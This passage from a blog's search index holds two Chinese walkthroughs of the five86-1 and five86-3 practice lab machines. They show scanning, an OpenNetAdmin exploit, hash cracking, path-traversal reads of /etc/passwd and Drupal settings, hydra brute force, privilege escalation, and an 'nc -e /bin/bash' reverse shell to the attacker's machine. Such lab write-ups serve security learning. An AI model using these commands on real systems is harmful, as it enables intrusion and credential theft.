          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> Five靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Five靶机-1</title>
      <link href="/2024/04/11/five/five86-1/"/>
      <url>/2024/04/11/five/five86-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="five86-1"><a href="#five86-1" class="headerlink" title="five86-1"></a>five86-1</h1><h2 id="主机探测-端口扫描"><a href="#主机探测-端口扫描" class="headerlink" title="#主机探测-端口扫描"></a>#主机探测-端口扫描</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -T4 -F -sS -sV 192.168.43.14</span><br></pre></td></tr></table></figure><p>​<img src="/assets/F1-20231023151941-pwm7csc.png" alt="F1">​</p><h2 id="指纹识别-目录爆破"><a href="#指纹识别-目录爆破" class="headerlink" title="#指纹识别-目录爆破"></a>#指纹识别-目录爆破</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whatweb 192.168.43.14：10000</span><br><span class="line">dirsearch -u 192.168.43.14 </span><br></pre></td></tr></table></figure><p>​<img src="/assets/F13-20231023160631-117t8lz.png" alt="F13">​</p><h2 id="web界面"><a href="#web界面" class="headerlink" title="#web界面"></a>#web界面</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">80端口什么都没有</span><br><span class="line">10000端口存在webmin登录界面</span><br><span class="line">#本人心想一眼就是CMS框架，直接百度webmin漏洞复现，结果试了几个CVE，反而啪啪打脸</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>安全警告-Webmin 1.920 on five86-1.localdomain（Debian Linux 10）<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">#看到这个webMin的安全警告，不信邪，又试了一波，无果而终！</span><br><span class="line">#随后换了个思路，发现目录爆破出一个ona（OpenNetAdmin）尝试访问</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-10-23 152223](assets&#x2F;屏幕截图 2023-10-23 152223-20231023152310-nu36y3t.png)​</p><h2 id="访问ona界面"><a href="#访问ona界面" class="headerlink" title="#访问ona界面"></a>#访问ona界面</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">看这想一个管理界面</span><br><span class="line">又有版本提示，毕竟是靶机，直接searchsploit一波</span><br><span class="line">#根据信息提示：版本：18.1.1</span><br></pre></td></tr></table></figure><p>​<img src="/assets/F14-20231023161014-j80ihf8.png" alt="F14">​</p><h2 id="RCE打过去"><a href="#RCE打过去" class="headerlink" title="#RCE打过去"></a>#RCE打过去</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit opennetadmin 18.1.1</span><br><span class="line">#github搜EXP开打</span><br><span class="line">#或者是使用searchsploit，不过这里有个坑点，就是要对这个bash脚本进行转换格式，否则会报错</span><br><span class="line">#使用dos2unix 47691.sh这个命令，而且这里的shell不能转成TTY</span><br></pre></td></tr></table></figure><p>​​<img src="/assets/F15-20231023162337-2scht31.png" alt="F15">​​</p><p>​<img src="/assets/F21-20231023162956-hpv1loq.png" alt="F21">​</p><p>​<img src="/assets/F22-20231023162956-xz0g70h.png" alt="F22">​</p><h2 id="尝试提权"><a href="#尝试提权" class="headerlink" title="#尝试提权"></a>#尝试提权</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#尝试了一波，发现对回显做了限制，以及cd命令禁用</span><br><span class="line">#查看当前用户具有权限的文件，</span><br><span class="line">#只有三个部分</span><br><span class="line">#/proc </span><br><span class="line">#/var/www/html/reports/.htaccess </span><br><span class="line">#/var/log/ona.log</span><br><span class="line">whoami</span><br><span class="line">find / -type f -user www-data</span><br><span class="line">#结果发现只有/var/www/html/reports/.htaccess有权限</span><br><span class="line">cat /var/www/html/reports/.htaccess</span><br><span class="line">#再查看/var/www/.htpasswd得到一串密文</span><br><span class="line">cat /var/www/.htpasswd</span><br><span class="line">douglas:apr19fgG/hiM\$BtsL9qpNHUlylaLxk81qY1</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Fcat-20231023164624-26txoyz.png" alt="Fcat">​</p><p>​![屏幕截图 2023-10-23 164158](assets&#x2F;屏幕截图 2023-10-23 164158-20231023164624-ewrbutt.png)​</p><p>​<img src="/assets/Fbaudu%E7%BF%BB%E8%AF%91-20231023165114-55q570t.png" alt="Fbaudu翻译">​</p><h2 id="尝试解密"><a href="#尝试解密" class="headerlink" title="#尝试解密"></a>#尝试解密</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#根据提示..给了douglas的哈希值....使用crunch生成对应的字典</span><br><span class="line">crunch 10 10 aefhrt &gt; mima.txt</span><br><span class="line">#john破解</span><br><span class="line">john --wordlist=mima.txt hash.txt</span><br><span class="line">#得到账密</span><br><span class="line">douglas:fatherrrrr</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Fmima-20231023171036-783ndre.png" alt="Fmima">​</p><h2 id="ssh登录"><a href="#ssh登录" class="headerlink" title="#ssh登录"></a>#ssh登录</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ssh douglas@192.168.43.14</span><br><span class="line">#无法切换到其他用户</span><br><span class="line">#.ssh下存在id_rsa  id_rsa.pub</span><br><span class="line">#百度解释：↓</span><br><span class="line">#假设用户是 blue，执行 ssh-keygen 时，才会在 .ssh 这个目录里面产生所需要的两把 Keys ，分别是私钥 (id_rsa) 与公钥 (id_rsa.pub)。</span><br><span class="line">#注：Linux 是在 home/.ssh/ 目录下，而 Windows 是在 C:\Users\Feng\.ssh 目录下。</span><br><span class="line">#扩展：authorized_keys</span><br><span class="line">#就是为了让两个 Linux 机器之间使用 ssh 不需要用户名和密码。采用了数字签名 RSA 或者 DSA 来完成这个操作。</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Fsshdog-20231023170959-qesjr5h.png" alt="Fsshdog"></p><p>​​<img src="/assets/Fdog%E6%9D%83%E9%99%90%E4%BD%8E-20231023171345-5lfz1y4.png" alt="Fdog权限低">​</p><h2 id="尝试提权-1"><a href="#尝试提权-1" class="headerlink" title="#尝试提权"></a>#尝试提权</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">#douglas可以用jen的身份运行cp命令</span><br><span class="line">#联想到之前的公钥私钥，直接复制到jen的/home下</span><br><span class="line">#用douglas的id_rsa文件登陆jen的ssh，也即免密登陆jen的ssh。</span><br><span class="line">#复制到/tmp目录下是因为jen没有权限访问douglas目录下的文件</span><br><span class="line">cp .ssh/id_rsa.pub /tmp/authorized_keys</span><br><span class="line">chmod 777 /tmp/authorized_keys</span><br><span class="line">sudo -u jen /bin/cp /tmp/authorized_keys /home/jen/.ssh</span><br></pre></td></tr></table></figure><p>​![SUDO -L](assets&#x2F;SUDO -L-20231023172045-pdadsq1.png)</p><p>​<img src="/assets/Fjen-20231023172906-j2q9628.png" alt="Fjen">​</p><h2 id="jen信息收集"><a href="#jen信息收集" class="headerlink" title="#jen信息收集"></a>#jen信息收集</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#提示You have new mail</span><br><span class="line">cd /var/mail</span><br><span class="line">cat jen</span><br><span class="line">#得到moss密码:Fire!Fire!</span><br></pre></td></tr></table></figure><p>​<img src="/assets/MOSS%E5%AF%86%E7%A0%81-20231023173200-xg0m0ii.png" alt="MOSS密码">​</p><h2 id="登录moss"><a href="#登录moss" class="headerlink" title="#登录moss"></a>#登录moss</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh moss@127.0.0.1</span><br><span class="line">#发现存在.game目录</span><br><span class="line">#存在root的二进制文件，不知道干啥的</span><br></pre></td></tr></table></figure><p>‍</p><h2 id="提权"><a href="#提权" class="headerlink" title="#提权"></a>#提权</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo -l </span><br><span class="line">#无果</span><br><span class="line">find -user root -perm -4000 -prnit 2&gt;/dev/null</span><br><span class="line">#只有一个upyougame</span><br><span class="line">./upyougame </span><br><span class="line">#提权成功</span><br></pre></td></tr></table></figure><p>​<img src="/assets/FIND%E6%8F%90%E6%9D%83-20231023174434-rrdagj9.png" alt="FIND提权">​</p><p>​![屏幕截图 2023-10-23 174309](assets&#x2F;屏幕截图 2023-10-23 174309-20231023174319-1e43e68.png)​</p><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="#FLAG"></a>#FLAG</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/flag.txt</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-10-23 174348](assets&#x2F;屏幕截图 2023-10-23 174348-20231023174353-iauk535.png)​</p>]]></content>
      
      
      <categories>
          
          <category> Five靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> Five靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Five靶机-3</title>
      <link href="/2024/04/11/five/five86-3/"/>
      <url>/2024/04/11/five/five86-3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="five86-3"><a href="#five86-3" class="headerlink" title="five86-3"></a>five86-3</h1><p>#主机探测-端口扫描 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -A -p- -min-rate 8888 192.168.43.16</span><br></pre></td></tr></table></figure><p>​<img src="/assets/F12-20231026121117-btbrc60.png" alt="F12">​</p><p>#指纹识别-目录爆破 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whatweb 192.168.43.16</span><br><span class="line">dirsearch -u 192.168.43.16</span><br></pre></td></tr></table></figure><p>​<img src="/assets/F34-20231026121123-1m3wdvv.png" alt="F34">​</p><p>#web界面 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#CMS：drupal 7</span><br><span class="line">试了一圈dirsearch爆破出来的路径，没啥鸟用</span><br><span class="line">#随便注册个用户，返回时发现变成了admin用户</span><br><span class="line">#发现有图片上传</span><br><span class="line">#尝试上传木马</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Fweb-20231026121129-huxm0w0.png" alt="Fweb">​</p><p>#BP抓包上传木马 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#先上传张图片抓包看看请求体</span><br><span class="line">#复制</span><br><span class="line">ontent-Disposition: form-data; name=&quot;files[picture_upload]&quot;; filename=&quot;1.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line">#再抓包上传马子</span><br><span class="line">#改包，改格式---&gt;上传成功</span><br><span class="line">#百度一圈发现这个思路没啥鸟用，找不到上传路径</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Fweb%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-20231026121200-43ciqgi.png" alt="Fweb文件上传">​</p><p>​<img src="/assets/F%E4%B8%8A%E7%A0%81%E5%AD%97-20231026121207-npff236.png" alt="F上码字">​</p><p>#搜drupal7的漏洞 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#发现任意文件读取漏洞</span><br><span class="line">#https://www.exploit-db.com/</span><br><span class="line">#Exploit Code:</span><br><span class="line">http://example.com/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd</span><br><span class="line">#kali curl一下 浏览器看实在麻烦</span><br><span class="line">#/etc/passwd  得到几个用户名</span><br><span class="line">curl http://192.168.43.16/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd</span><br><span class="line">#看下网站配置文件</span><br><span class="line">curl http://192.168.43.16/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../var/www/html/sites/default/settings.php</span><br><span class="line">#得到密码</span><br><span class="line">&#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;x4lB0XxX&#x27;</span><br></pre></td></tr></table></figure><p>​<img src="/assets/EXPD7-20231026121228-dvebxmu.png" alt="EXPD7">​</p><p>​<img src="/assets/CURL%E7%9C%8B%E4%B8%80%E4%B8%8B-20231026121241-wkoz0mi.png" alt="CURL看一下"></p><p>​</p><p>#ssh敲门 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#唉，来个师傅解答一下：不指定22端口nmap就扫不到是咋回事</span><br><span class="line">#先扫下22端口</span><br><span class="line">nmap -p 22,80 -T4 -sT 192.168.43.16</span><br><span class="line">#22端口被过滤了，猜测是由于knock配置导致，毕竟之前也学到过</span><br><span class="line">#/etc/knockd.conf</span><br><span class="line">curl http://192.168.43.16/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/knockd.conf</span><br><span class="line">#15s内依次敲3个端口5004,4284,6872</span><br><span class="line">#端口看房状态维持60s，过后需要再敲。</span><br><span class="line">knock -d 200 192.168.43.16 5004 4284 6872</span><br><span class="line">#再次查看22端口---&gt;已是开启状态</span><br><span class="line">namp -p 22 -sT 192.168.43.16</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E5%AF%86%E7%A0%81-20231026121250-a9m5lu5.png" alt="配置文件的密码">​</p><p>#ssh登录</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#之前拿到了用户名和密码，hydra进行爆破</span><br><span class="line">knock -d 200 192.168.43.16 5004 4284 6872</span><br><span class="line">nmap -sT -p 22 192.168.43.16</span><br><span class="line">hydra -L user.txt -P m.txt</span><br><span class="line">#ssh登录sam</span><br><span class="line">ssh sam@192.168.43.16</span><br></pre></td></tr></table></figure><p>​<img src="/assets/SSH%E6%95%B2%E9%97%A8-20231026121259-13n2ym2.png" alt="SSH敲门">​</p><p>​<img src="/assets/%E6%95%B2%E9%97%A8+hydra+ssh%E7%99%BB%E5%BD%95-20231026121259-e97xp28.png" alt="敲门+hydra+ssh登录">​</p><p>#sam信息收集 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">#可root权限执行restart-web.sh</span><br><span class="line">#sam对web.sh具有读写权限</span><br></pre></td></tr></table></figure><p>#提取 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#提权</span><br><span class="line">echo  “nc -e /bin/bash 192.168.43.33 8888” &gt; restart-web.sh</span><br><span class="line">sudo ./restart-web.sh </span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%8F%90%E6%9D%83NC-20231026121308-yj1zikg.png" alt="提权NC">​</p><p>#FLAG </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#kali反弹成功，拿到rootshell</span><br><span class="line">id</span><br><span class="line">cat /root/flag.txt</span><br></pre></td></tr></table></figure><p>​<img src="/assets/FLAG-20231026121315-5quf0m9.png" alt="FLAG">​</p>]]></content>
      
      
      <categories>
          
          <category> Five靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> Five靶机 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
